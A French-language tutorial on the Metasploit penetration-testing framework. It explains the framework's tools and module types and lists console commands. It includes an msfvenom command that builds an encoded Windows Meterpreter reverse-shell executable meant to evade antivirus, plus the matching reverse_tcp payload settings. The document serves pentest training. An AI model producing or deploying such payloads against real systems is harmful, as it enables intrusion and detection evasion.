# 1) C'est quoi Metasploit 

* Metasploit est un des outils de test d'intrusion utilisés 
* Metasploit offre des outils pour identifier les vulnérabilités, développer des exploits et tester la pénétration.
# **2) Outils Principaux de Metasploit**

1. **MSFconsole** : Interface en ligne de commande avec une riche suite de commandes pour gérer, lancer des exploits et manipuler des sessions.

2. **MSFvenom** : Un outil de génération de payloads , utilisé pour créer différents types de payloads, y compris Meterpreter.

3. **Meterpreter** : Un payload avancé qui fournit un shell interactif, permettant aux attaquants de s'interfacer avec le système cible.

4. **MSFdb** : Permet d'intégrer Metasploit avec une base de données. Il facilite le suivi des vulnérabilités découvertes lors de l'exploitation.

# 3) Les types de modules 
Dans Metasploit, les modules sont organisés en plusieurs catégories en fonction de leur fonctionnalité. Voici les principaux types de modules que vous pouvez trouver dans Metasploit:

1. **Exploits** : Code d'exploitation d'une vulnérabilité spécifique détecté
2. **Payloads** : Code exécuté sur la cible. L'action qui sera executé sur la machine
3. **Auxiliary** : Utilitaires qui ne sont pas nécessairement des exploits ou des payloads, comme des scanners pour détecter des vulnérabilités, des serveurs pour capturer du trafic, ou des outils pour effectuer des attaques par déni de service.
4. **Post** : Post-exploitation pour extraire des données, escalader des privilèges, ou effectuer d'autres actions
5. **Encoders** : Les encoders sont utilisés pour s'assurer que les payloads passent inaperçus et ne sont pas détectés par des mécanismes de défense tels que les antivirus. Ils modifient l'apparence du payload tout en conservant sa fonctionnalité.
6. **Nops** : Les "No Operation" sont utilisés pour garantir que l'exploit fonctionne correctement en créant un espace tampon stable. Ils sont souvent utilisés pour maintenir la taille et l'emplacement d'un exploit en mémoire.
7. **Evasions** (dans les versions plus récentes de Metasploit) : Eviter la détection par des systèmes de détection et de prévention des intrusions.
* Lister l'arborescence de metasploit pour trouver ce qu'on cherche
```
tree /usr/share/metasploit-framework/modules/ -L 2
```
# **3) Utilisation de Metasploit**
0. Lancer métasploit
```
msfconsole
```
1. Recherche des modules spécifiques 
```
search type:exploit name:apache
```
2. Charger un module spécifique
```
use [CHEMIN|NUM]
```
3. Afficher et définir les options d'un module 
```
info
show options
set [VARIABLE] [VALEURS]
run
```
4. Affiche les sessions actives avec une/des cibles
```
sessions # Affiche la liste de toutes les sessions actives.
sessions -i [ID] # Intéragir avec une session
sessions -K # Terminer toutes les sessions actives.
sessions -k [ID] #Terminer une session spécifique
sessions -u [ID] #Mettre à niveau une session shell simple en Meterpreter.
```
5. Mettre la session en arrière-plan
```
background
```


# 4) Utilisation de Msfvenom
0. Lister et choisir un payload
```
msfvenom -l payloads
msfvenom -l encoders
```
1. Générer un payload 
```
msfvenom -p [payload] LHOST=[LHOST] LPORT=[LPORT] -f [format] -o [output file]

-e [encoder] : Encodage du payload (optionnel)
-i [NUM] : Le nombre d'encodage du payload
```
2. Exemple d'un payload reverse shells 
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe
```

# 5) Utilisation de Meterpreter
* Pour définir meterpreter dans une exploit comme le payload
```
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [Votre IP]
set LPORT [Port d'écoute]
set RHOST [IP de la cible]

```
